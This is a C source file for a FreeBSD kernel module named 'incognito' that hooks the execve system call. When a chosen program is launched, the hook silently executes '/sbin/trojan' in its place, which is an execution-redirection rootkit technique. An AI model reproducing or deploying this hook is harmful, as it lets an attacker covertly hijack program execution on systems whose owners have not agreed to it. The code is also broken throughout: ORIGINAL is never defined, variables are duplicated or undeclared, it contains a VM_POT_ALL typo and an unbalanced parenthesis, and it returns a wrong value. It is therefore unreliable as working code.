#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>

#define HELLO "/sbin/hello"
#define TROJAN "/sbin/trojan"

static int
trojan_execve(struct thread *td, void *syscall_args) 
{
	/* Keep this struct definition in the namespace 
	 * of the hook
	 */
	struct execve_args /* {
		char *fname;
		char **argv;
		char **envv;
	} */ *uap;

	uap = (struct execve_args *)syscall_args;
	
	struct execve_args kernel_ea;
	struct execve_args *user_ea;
	struct vmspace *vm;
	vm_offset_t *vm;
	char t_fname[] = TROJAN;

	/* 
	 * Check if target matches the name of ORIGINAL
	 */
	if (strcmp(uap->fname, ORIGINAL) == 0) {
		/*
		 * Determine the end boundary of the current 
		 * process' user data space
		 */
		vm = curthread->td_proc->p_vmspace;
		base = round_page((vm_offset_t) vm->vm_daddr);
		addr = base + ctob(vm->vm_dsize);

		/*
		 * Use the vm_map_find() routine to allocate
		 * a PAGE_SIZE null region of memory for 
		 * storing a new set of execve arguments
		 */
		vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE,
			VM_POT_ALL, VM_PROT_ALL, 0);
		vm->vm_dsize = btoc(PAGE_SIZE);

		/*
		 * Copy out the Trojan name to the location 
		 * of the curren process' user data space
		 */
		copyout(&t_fname, (char *)addr,  strlen(t_fname));
		kernel_ea.fname = (char *)addr;
		kernel_ea.argv = uap->argv;
		kernel_ea.envv = uap->envv;

		/* Copy out the trojan's execve structure to 
		 * the spot right after the t_fname's storage
		 */
		user_ea = (struct execve_args *)addr + sizeof(t_fname);
		copyout(&kernel_ea, user_ea, sizeof(struct execve_args);
	
		/*
		 * Execute the Trojan code
		 */
		return execve(cur_thread, user_ea);
	}

	return 1;
}

static int
load(struct module *module, int cmd, void *arg)
{
	int error = 0;

	/*
	 * XXX: In practice, this should only perform the
	 * MOD_LOAD actions and not uprintf() anything
	 */
	switch (cmd) {
	case MOD_LOAD:
			sysent[SYS_execve] = (sy_call_t *)trojan_execve;
			uprintf("Module loaded successfully.\n");
			break;
	case MOD_UNLOAD:
			sysent[SYS_execve] = (sy_call_t *)execve;
			uprintf("Module unloaded.\n");
			break;
	default:
			error = EOPNOTSUPP;
			break;
	}

	return error;
}


static struct moduledata_t incognito_mod = {
	"incognito",
	load,
	NULL
};

DECLARE_MODULE(incognito, incognito_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
